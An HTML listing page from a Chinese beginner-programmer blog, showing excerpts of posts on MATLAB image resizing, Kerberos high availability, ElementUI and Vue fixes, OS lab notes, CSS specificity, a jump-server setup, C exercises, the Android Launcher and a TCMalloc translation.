<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38dba07682dfb2ce7004e200be061124/" rel="bookmark">
			【数字图像处理】MATLAB实现图像缩小的两种算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图像形状变换——图像缩小的MATLAB实现 代码实现
1）基于像素采样的图像缩小方法：
% function [im] = resize(I,kr,kc) % I = imread('img\han.jpg'); % [im1] = dip(I,0.3,0.5); function [im] = dip(I,kr,kc) [m,n,d] = size(I); % 得到原始图像尺寸 m2 = round(kr*m); % round函数：四舍五入 n2 = round(kc*n); % 得到新图像尺寸：m2 n2 c1 = 1/kr; c2 = 1/kc; J = zeros(m2,n2,d); % 初始化新图像矩阵J for i=1:m2 for j=1:n2 % 计算新图对应原图的x,y坐标--缩小 x = round(c1*i); y = round(c2*j); % 检查对应坐标边界条件 if x&gt;m x = m; end if y&gt;n y = n; end if x&lt;1 x = 1; end if y&lt;1 y = 1; end J(i,j,:) = I(x,y,:); end end im = uint8(J); figure,imshow(I);title('原图'); figure,imshow(im);title('基于像素采样缩小后的图像'); end 2）基于局部均值的图像缩小方法：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38dba07682dfb2ce7004e200be061124/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7641ce56af6523398974737c2c073fe9/" rel="bookmark">
			Kerberos  HA高可用配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kerberos 高可用配置 Kerberos 安装(主节点操作) 节点信息 data80 data81 data82 data83 备注 主Kerberos节点：data80备Kerberos节点：data81 安装 kdc server 在KDC(name01)上安装包 krb5、krb5-server 和 krb5-client
yum install krb5-server krb5-libs krb5-auth-dialog krb5-workstation -y 安装 krb5-devel、krb5-workstation
yum install krb5-devel krb5-workstation -y 修改 krb5.conf /etc/krb5.conf
includedir /etc/krb5.conf.d/ [logging] default = FILE:/var/log/krb5libs.log kdc = FILE:/var/log/krb5kdc.log admin_server = FILE:/var/log/kadmind.log [libdefaults] dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false pkinit_anchors = /etc/pki/tls/certs/ca-bundle.crt default_realm = HADOOP.COM default_ccache_name = KEYRING:persistent:%{uid} [realms] HADOOP.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7641ce56af6523398974737c2c073fe9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2873d800216d30af6253bb6e15818f90/" rel="bookmark">
			mongo局域网连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 安装软件之后
关闭防火墙
修改这个路径下的文件
允许这个路径下的程序通过
允许端口通过
不管是本机还是远程都能访问了
记得重启服务 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7c239eb0b155815ceedb1bf72589b06/" rel="bookmark">
			Element中使用el-form-item内部el-input为textarea时由于自生成的.el-form-item__content导致无法设置textarea百分比宽度问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求 使用ElementUI创建一个网上书店系统时，一个界面需要实现一个弹出框上提交一个较多信息的表单的效果。需求类似于下图。
前提条件 由于表单内容较多，设置其格式为小尺寸和行内元素
&lt;el-form :model="book" size="small" inline="true"&gt; 对于上方两个公用一行的表单项，按照以下模板设置。
&lt;el-form-item label="书名" :label-width="formLabelWidth" style="width: 45%;"&gt; &lt;el-input v-model="book.name" autocomplete="off" suffix-icon=“xxxx”&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;el-form-item label="作者" :label-width="formLabelWidth" style="width: 45%;"&gt; &lt;el-input v-model="book.name" autocomplete="off" suffix-icon=“xxxx”&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; 问题 在写简介的多行文本框时，出现问题。
按照模板写的代码如下。其中除少量参数不同外基本与模板相同。
&lt;el-form-item label="简介" :label-width="formLabelWidth" style="width: 90%; display: block;"&gt; &lt;el-input type="textarea" :rows="4" placeholder="请输入内容" v-model="book.intro" style="width: 100%"&gt; &lt;/el-input&gt; &lt;/el-form-item&gt; 出现问题
可以发现，即使是在HTML代码中给每一层都设置了width百分比，下面的文本框却没有按照预期的百分比宽度出现。
进一步分析，将最内层的textview宽度设置成固定较大的像素500px，界面可以正常渲染。
问题分析 在谷歌浏览器中使用开发者工具分析DOM结构
发现在我们写的两个控件之间，element自动为我们生成了一个class为el-form-item__content的div。正是这个div阻断了我们的百分比向下的传递路径。使用百分比宽度/高度，必须是在父控件宽度/高度确定的时候。
由于该div根本没有在我们的HTML文档中出现，所以在不修改Element源码的前提下，可以使用CSS样式覆盖的方式解决。
要想运用此方法，我们需要先对CSS的权重和继承有一定的了解，同时要对如何进行CSS覆盖有一个基本的认识。接下来的操作只用到了其中的基本内容，但如果读者对此全无了解，推荐先花上20分钟去阅读相关博客，网上有很多写的很详细的文章。
问题解决 首先在HTML中给出问题的el-form-item加上一个div，并设置其class为aa。
&lt;div class="aa"&gt; &lt;el-form-item label="简介" :label-width="formLabelWidth" style="width: 90%; display: block;"&gt; &lt;el-input type="textarea" :rows="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7c239eb0b155815ceedb1bf72589b06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b0225cd4b20d8f9bceaa47ee1523561/" rel="bookmark">
			如何下载vue-resource.js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.vue-resource是干嘛用的 Vue 要实现异步加载需要使用到 vue-resource 库。
Vue.js 2.0 版本推荐使用 axios 来完成 ajax 请求。
2.怎么下载 浏览器打开https://cdn.staticfile.org/vue-resource/1.5.1/vue-resource.min.js这个网址，然后Ctrl+s保存到本地就可以了，然后js中引入本地的路径。
当然也可以使用在线的，直接在js中引入，如下：
&lt;script src="https://cdn.staticfile.org/vue-resource/1.5.1/vue-resource.min.js"&gt;&lt;/script&gt; 如何发送请求 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src="lib/vue.js"&gt;&lt;/script&gt; &lt;script src="lib/vue-resource.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;h3&gt;{{weather}}&lt;/h3&gt; &lt;h3&gt;{{address}}&lt;/h3&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; //如果我们通过全局配置了，请求的数据接口 根域名，则 在每次单独发起http 请求的时候，请求的url路径，应该以相对路径开头，前面不能带 /，否则不会启用根路径做拼接 Vue.http.options.root = 'https://free-api.heweather.net/'; var vm = new Vue({ el:"#app", data: { weather:'', address:'', }, created(){ this.getInfo() }, methods: { getInfo(){ this.$http.get('s6/weather/now?location=beijing&amp;key=daef4fb5807d4faa96d1b7dab16d981d').then(result =&gt; { var result = result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b0225cd4b20d8f9bceaa47ee1523561/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8ff883c221e355dfe3a3625d7bbe07f/" rel="bookmark">
			山东大学操作系统实验问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文以记录完成2020学年上期操作系统实验过程中的学习和参考资料 基础pv基础 Makefilefork()函数实验四：进程同步实验基础示例变量函数 吸烟者问题(Smoker Problem) 实验五：进程互斥实验 基础 vim详解将vim的内容复制到系统剪切板上将字符串转换为整数类型处理warning：implicit declaration of function XXX，是因为函数没有在头文件定义，因此导致编译的时候没法儿正确生成.o文件。我出现了下图的状况：
添加&lt;unistd.h&gt;头文件，这是Linux/Unix内置系统的头文件，包含很多系统服务的函数原型。C、C++中union用法总结Linux目录文件权限，还真是啥都忘了吼fgets函数 pv基础 信号量S：
若大于等于0，则表示可供并发进程使用的资源的实体数；
若小于0，则表示正在等待使用临界区的进程的个数
所以初值应该设为大于0原语：不可中断的程序段P：S-1
若结果仍然大于等于0，则进程继续执行；
若结果小于0，则进程阻塞，进入与该信号相对应的队列当中，然后转进程调度。
V：S+1
若结果仍然大于0，则进程继续执行；
若结果小于等于0（注意0的情况在第二种），则从该信号的等待队列中唤醒一个等待进程，然后再返回原来的进程继续执行或转进程调度。临界资源：每次仅允许一个进程访问的资源，例如打印机，消息缓冲队列，变量，缓冲区等等。大多数情况下同步已经实现了互斥，同步是在互斥的基础上通过其他机制实现访问者对资源的有序访问（互斥是无序的)。 Makefile 跟我一起写Makefile（一）
跟我一起写Makefile（二）
（系列文章都在评论中有指路）
初次尝试离开IDE编程，对工程的编译有了更深的认识。
这是一个文件的依赖关系，也就是说，target这一个或多个的目标文件依赖于prerequisites中的文件，其生成规则定义在command中。说白一点就是说，prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。这就是Makefile的规则。也就是Makefile中最核心的内容。
make会在当前目录下找名字叫“Makefile”或“makefile”的文件。如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“edit”这个文件，并把这个文件作为最终的目标文件。
————————————————
版权声明：本文为CSDN博主「haoel」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/haoel/article/details/2886
每个Makefile中都应该写一个清空目标文件（.o和执行文件）的规则，这不仅便于重编译，也很利于保持文件的清洁。
更为稳健的做法是：
.PHONY : clean
clean :
-rm edit *.o
前面说过，.PHONY意思表示clean是一个“伪目标”，。而在rm命令前面加了一个小减号的意思就是，也许某些文件出现问题，但不要管，继续做后面的事。
———————————————— 版权声明：本文为CSDN博主「haoel」的原创文章，遵循 CC 4.0 BY-SA
版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/haoel/article/details/2887
fork() fork()父子进程共享
fork()父子进程运行优先顺序
在实验中遇到了一点问题，如下代码：
#include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; main () { pid_t pid; pid=fork(); if (pid &lt; 0) printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8ff883c221e355dfe3a3625d7bbe07f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97f7e3f6973e838ef0627d40a9728d1d/" rel="bookmark">
			Element el-date-picker datetimerange使用及限制时间范围
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用场景：
1）初始化时间为明天零点到7天后晚上23:59:59秒
2）不允许选今天之前的日期
&lt;el-date-picker v-model="rangeTime" type="datetimerange" range-separator="至" start-placeholder="开始日期" end-placeholder="结束日期" @blur="onTimeChange" :picker-options="datePickerOptions"&gt; &lt;/el-date-picker&gt; 1）初始化时间
initTime: function () { let oneDay = 1000 * 60 * 60 * 24; let dateNextZero = new Date(new Date().getTime() + oneDay); dateNextZero.setHours(0); dateNextZero.setMinutes(0); dateNextZero.setSeconds(0); let date6Later = new Date(new Date().getTime() + (oneDay * 6)); date6Later.setHours(23); date6Later.setMinutes(59); date6Later.setSeconds(59); this.startTime = formatDateTime(dateNextZero.getTime()); this.endTime = formatDateTime(date6Later.getTime()); this.rangeTime = [this.startTime, this.endTime]; }, 2）限制不能选今天之前的
data里
datePickerOptions:{ disabledDate:(time)=&gt;{ let nowDate = new Date(); let oneDay = 1000 * 60 * 60 * 24; let oneYearLater = new Date(nowDate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97f7e3f6973e838ef0627d40a9728d1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e502eaa0fb7acfb297d32dc843b38e2/" rel="bookmark">
			Python学习笔记#4：快速生成二维矩阵的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 普通方法：简洁方法错误的方法 高级方法 普通方法： 最简单易懂的方法，这种逻辑不仅适用于 python，也适用于任何变成语言。
row = 5 col = 8 matrix = [] for i in range(row): m = [] for j in range(col): m.append(False) matrix.append(m) # 矩阵打印函数 def showMatrix(): for i in range(row): for j in range(col): print(matrix[i][j], end="\t") print() showMatrix() print("更改 matrix[1][1] 的值为 True ") matrix[1][1] = True showMatrix() False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False 更改 matrix[1][1] 的值为 True False False False False False False False False False True False False False False False False False False False False False False False False False False False False False False False False False False False False False False False False 简洁方法 列表解析是python的一大特点，它能够是代码更加简洁易懂。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e502eaa0fb7acfb297d32dc843b38e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74c809a350b32b72135a9759d6ea6ec5/" rel="bookmark">
			神经网络部署--网络压缩技术Network Compression
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 network pruning network pruning技术的思路是：训练一个大的神经网络→评价网络中参数和神经元的重要度→根据重要度排序，移除不重要的weight和神经元（置0）
为什么要训练一个大的网络再压缩，而不是直接训练一个小的网络呢？
因为研究表明，大的网络比较容易训练，效果也更好。
2 knowledge distillation 训练一个大的，效果好的神经网络→训练一个小的网络，但是损失函数不以实际值为参照，而是以大的网络的输出为参照进行训练
这种做法通常效果不佳
3 parameter quantization parameter quantization是一种减少神经网络需要的储存空间的技术
采用较少的bit来储存神经网络的值首先将weight进行聚类，直接储存类别和类别代表的值，而不是储存每一个weight，这样就会减少存储的需要的空间也可以采用huffman编码等方式来减少储存采用binary connect来设置权重，即权重都是+1或者-1 4 Architecture Design 设计网络架构来减少权重的个数，例如下图的网络，从前一层神经元个数N到后面一层神经元个数是M，W的个数为N×M。
如果在两层之间增加一层的话，如下图所示，那么W的个数为N×K+M×K，合理设置K的值，就能使权重的数量减少
现在采用这种技术的网络主要有：
depth separable convolutionsqueezeNetmobileNetshuffleNetXception 5 dynamic computaion 动态计算追寻的是一种“先求有，再求好”理念，例如著名的Multi-Scale Dense Networks，首先训练一个多重分类器，然后在选择其中某一层的输出作为最终的分类器。
训练完一整个分类器后，可以将layer1或者layer2的输出作为压缩的分类器使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c44bc8fce0d9113b39151ce4e51eb24/" rel="bookmark">
			什么是跳板机？XShell如何通过跳板机连接内网机器？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、了解跳板机 跳板机（Jump Server），也称堡垒机，是一类可作为跳板批量操作远程设备的网络设备，是系统管理员或运维人员常用的操作平台之一。
跳板机是网络中容易受到侵害的主机，所以跳板机也必须是自身保护完善的主机。通常至少配备两块网卡设备，分别具备不同的网络连接。一个连接外网，用以对目标服务器的远程登录及维护；另一个则连接内网，便于内部网络的管理、控制和保护，通过网关服务提供从私网到公网，或从公网到私网的特殊协议路由服务。
二、简单的跳板机实现 1.要求 跳板机上为每个开发人员创建一个账号，并且只能在指定的目录里管理自己的文件。线上生产服务器，禁止使用root用户远程登录。线上生产服务器sshd服务不允许使用默认端口，防止黑客通过端口扫描。线上生产服务器上开发人员使用的账号code用户的密码使用工具随机生成。 2.分析 在跳板机上为开发人员创建账号公共目录需要有高级权限禁止root用户远程登录系统更改ssh协议的端口号内网环境下安装软件 3.拓扑图 4.环境的介绍 PC为本机，已禁用VMware网卡1，本机IP为192.168.39.39/2
Jump-server为centos6虚拟机，安装两块网卡，ip分别为192.168.189.132/24; 1192.168.189.132/24,跳板机能够ping通PC和Service
service为Centos6虚拟机，安装一块网卡，IP为192.168.189.128
目前PC端无法连接192.168.189.0/24网段的所有IP
两个Centos均安装openssh-client和openssh-service
5.实验具体步骤 (1)创建用户并增加相应权限
[root@jiangfeng1 ~]# groupadd coding [root@jiangfeng1 ~]# useradd -G coding code1 [root@jiangfeng1 ~]# useradd -G coding code2 [root@jiangfeng1 ~]# echo 123456 | passwd --stdin code1 #更改用户 code1 的密码 。 passwd： 所有的身份验证令牌已经成功更新。 [root@jiangfeng1 ~]# echo 123456 | passwd --stdin code2 #更改用户 code2 的密码 。 passwd： 所有的身份验证令牌已经成功更新。 [root@jiangfeng1 ~]# mkdir -p /code/data [root@jiangfeng1 ~]# chown :coding /code/data/ [root@jiangfeng1 ~]# chmod 1770 /code/data/ [root@jiangfeng1 ~]# ll -d /code/data/ drwxrwx--T 2 root coding 4096 7月 20 03:33 /code/data/ (2)禁止root远程登录和更改默认端口号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c44bc8fce0d9113b39151ce4e51eb24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a2c3a7755ca854eadfa04f2c6836777/" rel="bookmark">
			CSS权重——发现样式正确但不起效果时，就要考虑规则的权重问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 什么是权重？ 当很多的规则(样式)被应用到元素时，权重是一个决定那种规则生效，或者优先级的过程
样式权重的计算时相加关系，值越高，权重越高，优先级越大
权重等级与权值 行内样式（1000）&gt;id选择器（100）&gt;类，属性选择器和伪类选择器（10）&gt;元素和伪元素（1）&gt;*通配符(0)
最高：!important加在样式属性值后，权重值为 10000（尽量不要使用）
行内样式（1000）
&lt;p style="color: #000000;"&gt;行业样式&lt;/p&gt; id选择器（100）
#id{ color: #000000; } 类，属性选择器和伪类选择器（10）
.class{ color: #000000; } .class:hover{ color: #017FCB; } 元素和伪元素（）
div{ color: #000000; } div:before{ color: #017FCB; } 通用选择器（*）、子选择器（&gt;）、相邻选择器（+）、同胞选择器（~）（0）
*{ padding: 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/673df8b8a854827a6b347d0a19639196/" rel="bookmark">
			将多个空格转化为只有一个空格输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;stdio.h&gt; int main() { char c = 0; int num = 0; while ((c = getchar()) != EOF) { if (c == 32) { ++num; } else { num = 0; } if (num &lt;= 1) { putchar(c); } } } 空格这一字符的ASCII码为32.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e5abb93baebe09f65ee1e07e536cc9e/" rel="bookmark">
			【PTA】7-12 日期格式化 (5分)_中M2020春C入门练习第I段——变量、表达式、分支、循环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目 世界上不同国家有不同的写日期的习惯。比如美国人习惯写成“月-日-年”，而中国人习惯写成“年-月-日”。下面请你写个程序，自动把读入的美国格式的日期改写成中国习惯的日期。
输入格式： 输入在一行中按照“mm-dd-yyyy”的格式给出月、日、年。题目保证给出的日期是1900年元旦至今合法的日期。
输出格式： 在一行中按照“yyyy-mm-dd”的格式给出年、月、日。
输入样例： 03-15-2017
输出样例： 2017-03-15
解答 #include&lt;stdio.h&gt; int main(){ int month,day,year; scanf("%d-%d-%d", &amp;month, &amp;day, &amp;year); printf("%d-%02d-%02d",year, month, day); return 0; } 注意 我们在输出时可以在格式声明中指出输出数据的域宽（所占的列数）。
（1）如“%2d”是指定输出数据占两列，输出的数据显示在此两列区域的右侧。
（2）而“%02d”即是将原来没有数据所在的列（空格）替换成0。
例如，如果要输出的数据是整数3，则
（1）的输出是“ 3”；
（2）的输出是“03”
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b446ab807a45a839ae07e86d2b57804/" rel="bookmark">
			Android 9.0 Launcher Workspace 加载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		加载Workspace入口在/packages/apps/Launcher3/src/com/android/launcher3/model/LoaderTask.java，想了解Launcher app的启动流程，可以先看看这篇文章，https://www.jianshu.com/p/0b273112cd7e
1、Workspace加载调用过程，如图 代码入口：
/packages/apps/Launcher3/src/com/android/launcher3/model/LoaderTask.java，
public void run() { synchronized (this) { // Skip fast if we are already stopped. if (mStopped) { return; } } TraceHelper.beginSection(TAG); try (LauncherModel.LoaderTransaction transaction = mApp.getModel().beginLoader(this)) { TraceHelper.partitionSection(TAG, "step 1.1: loading workspace"); loadWorkspace(); ... transaction.commit(); } catch (CancellationException e) { // Loader stopped, ignore TraceHelper.partitionSection(TAG, "Cancelled"); } TraceHelper.endSection(TAG); } } ··· 接下来是总体调用过程：
private void loadWorkspace() { ...	LauncherSettings.Settings.call(contentResolver, LauncherSettings.Settings.METHOD_LOAD_DEFAULT_FAVORITES); ... } // If there are any empty screens remove them, and update.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b446ab807a45a839ae07e86d2b57804/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94d94f63a69d30cc50d57b05fe3ae9ea/" rel="bookmark">
			TCMalloc：线程缓存Malloc
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【博文目录&gt;&gt;&gt;】 【项目地址&gt;&gt;&gt;】 TCMalloc：线程缓存Malloc 本文翻译了TCMalloc : Thread-Caching Malloc最重要的部分，TCMalloc是go语言内存分配的基石，go内存分配置就是从TCMalloc演化而来。其余部分内容可参见原文。
动机 内存分配速度快。TCMalloc比我测试过的glibc 2.3 malloc（可称为ptmalloc2的独立库）和其他malloc更快。ptmalloc2在2.8 GHz P4上（用于小型对象）执行malloc / free对大约需要300纳秒。对于同一操作对，TCMalloc实现大约需要50纳秒。速度对于malloc实现很重要，因为如果malloc不够快，应用程序编写者倾向于在malloc之上编写自己的自定义空闲列表。除非应用程序编写者非常小心地适当调整可用列表的大小并从空闲列表中清除空闲对象，否则这可能导致额外的复杂性和更多的内存使用。
TCMalloc还减少了多线程程序的锁争用。对于小对象，竞争几乎为零。对于大对象，TCMalloc尝试使用细粒度且高效的自旋锁。ptmalloc2还通过使用每个线程的竞技场来减少锁争用，但是ptmalloc2使用每个线程的竞技场存在一个大问题。在ptmalloc2中，内存永远无法从一个领域移动到另一个领域。这会导致大量的空间浪费。例如，在一个Google应用程序中，第一阶段将为其数据结构分配大约300MB的内存。当第一阶段完成时，第二阶段将在相同的地址空间中开始。如果为第二阶段分配的舞台不同于第一阶段使用的舞台，此阶段将不重用第一阶段之后剩余的任何内存，并将在地址空间中再增加300MB。在其他应用程序中也发现了类似的内存爆炸问题。
TCMalloc的另一个好处是小对象的空间高效表示。例如，可以在使用大约8N * 1.01字节的空间时分配N个8字节的对象。即，空间开销为百分之一。ptmalloc2为每个对象使用一个四字节的标头，并且（我认为）将大小四舍五入为8个字节的倍数，最后使用16N字节结束。
##总览
TCMalloc为每个线程分配一个线程本地缓存。线程本地缓存满足小分配。根据需要将对象从中央数据结构移动到线程本地缓存中，并使用定期垃圾回收将内存从线程本地缓存迁移回中心数据结构中。
TCMalloc将大小小于等于32KB的对象（“小”对象）与大对象区别对待。使用页级分配器（一页就是4KB对齐内存区域）直接从中央堆分配大对象。即，大对象始终是页对齐的，并且占据整数页。
可以将一页纸拆分成一系列小对象，每个大小均相等。例如，一页（4K）可以分成32个对象，每个对象大小为128字节。
小对象分配 每个小对象大小映射到大约170个可分配大小类别之一。例如，在961到1024字节范围内的所有分配都被四舍五入为1024。大小类别是空间化的，以使小尺寸被8字节分隔，大尺寸被16字节分隔，更大尺寸被32字节分隔，依此类推。 。最大空间（对于大小&gt; =〜2K）为256个字节。
线程缓存包含每个大小类别的空闲对象的单链列表。
当分配一个小对象时：
（1）我们将其大小映射到相应的大小类别。（2）在线程高速缓存中的相应空闲列表中查找当前线程。（3）如果空闲列表不为空，则从列表中删除第一个对象并返回它。当遵循此快速路径时，TCMalloc根本不会获得任何锁。因为在2.8 GHz Xeon上，锁定/解锁对大约花费100纳秒，所以这大大有助于加速分配。 如果空闲列表为空：
（1）我们从该大小类别的中央空闲列表中获取一堆对象（中央空闲列表由所有线程共享）。（2）将它们放在线程本地空闲列表中。（3）将新获取的对象之一返回给应用程序。 如果中央空闲列表也为空：
（1）我们从中央页面分配器分配“大量的页面”（a run of pages）。（2）将“大量的页面”（the run）分成一组该大小级别的对象。（3）将新对象放置在中央空闲列表上。（4）和以前一样，将其中一些对象移动到线程本地空闲列表中。 大对象分配 大对象大小（&gt; 32K）被四舍五入为页面大小（4K，即4K的整数倍），并由中央页面堆处理。中央页面堆也是一组空闲列表。对于i&lt;256，第k条目是包含k个页面的运行的空闲列表。第256项是长度&gt;=256个页面的免费空闲列表：
通过在k空闲列表中查找，可以满足分配k个页面要求。如果该空闲列表为空，则我们查找下一个空闲列表，依此类推。最终，如有必要，我们将查找最后一个空闲列表。如果失败，我们从系统中获取内存（使用sbrk，mmap或通过映射/dev/mem的一部分）。
如果k个页面的分配由长度大于k的大量页面满足（例如：需要4KB的页，但是分配了大量8KB的页），则将大量的其余部分重新插入到页面堆中的相应空闲列表中（即将8KB的空闲页面放到对应的8KB空闲列表）。
跨度（Span） TCMalloc管理的堆由一组页面组成。大量的连续页由一个Span对象表示。Span要么是已分配的，要么是空闲的。如果是空闲的，则spna是页面堆链表（页面堆链表：page heap linked-list）中的条目之一。如果已分配，则它要么是已移交给应用程序的大对象，要么是已分成多个小对象序列的页面。如果拆分为小对象，则将对象的大小级别记录在跨度中。
由页码索引的中央数组可用于查找页面所属的跨度。例如，下面的跨度a占2页，跨度b占1页，跨度c占5页，跨度d占3页。
32位地址空间可容纳2^20 4K页，因此此中央数组占用4MB的空间，这似乎可以接受。在64位计算机上，我们使用3级基数树而不是数组来将页码映射到相应的跨度指针。
解除分配 释放对象后，我们将计算其页码并在中央数组中查找以找到相应的跨度对象。跨度告诉我们对象是否小，如果大小小则告诉我们大小级别。如果对象较小，则将其插入当前线程的线程缓存中的相应空闲列表中。如果线程缓存现在超过预定大小（默认为2MB），我们将运行垃圾回收器，将未使用的对象从线程缓存移至中央空闲列表。
如果对象很大，则跨度会告诉我们该对象包含的页面范围。假设范围是[p,q]。我们还将查找页面p-1和的跨度q+1。如果这些相邻跨度中的任意一个是空闲的，则将它们与[p,q]跨度合并。将结果跨度插入到页面堆中相应的空闲列表中。
小对象中央空闲列表 如前所述，我们为每个大小级别保留一个中央空闲列表。每个中央空闲列表被组织为两级数据结构：一组span，以及每个span的空闲对象的链表。
通过从某个span的链接列表中删除第一个条目，可以从中央空闲列表中分配一个对象。（如果所有span都具有空链接列表，则首先从中央页面堆中分配一个适当大小的范围。）
通过将对象添加到其包含span的链接列表中，可以将对象返还到中央空闲列表。如果链接列表的长度现在等于span围中小对象的总数，则该span现在是完全空闲的并返回到页面堆。
线程缓存的垃圾回收 当高速缓存中所有对象的总大小超过2MB时，便会垃圾回收线程高速缓存。随着线程数量的增加，垃圾回收阈值会自动降低，这样我们就不会在具有很多线程的程序中浪费过多的内存。
我们遍历缓存中的所有空闲列表，然后将一些对象从空闲列表移到相应的中央列表。
使用每个列表的低水位标记L确定要从空闲列表中移动的对象的数量。L记录自上次垃圾回收以来列表的最小长度。请注意，我们可以在上一个垃圾回收时通过对象L将列表缩短，而无需对中央列表进行任何额外的访问。我们使用过去的历史作为将来访问的预测，并将L/2对象从线程高速缓存可用列表移动到相应的中央空闲列表。该算法具有很好的属性，即如果某个线程停止使用特定大小，则该大小的所有对象将快速从线程缓存移至中央空闲列表，其他线程可以在该列表中使用它们。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/571e04cfac0b2c9a73cdb8f886c48265/" rel="bookmark">
			CentOS7中安装搜狗输入法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		centos 自带的输入法在很多软件中识别不了！
搞了两天，踩了很多坑！
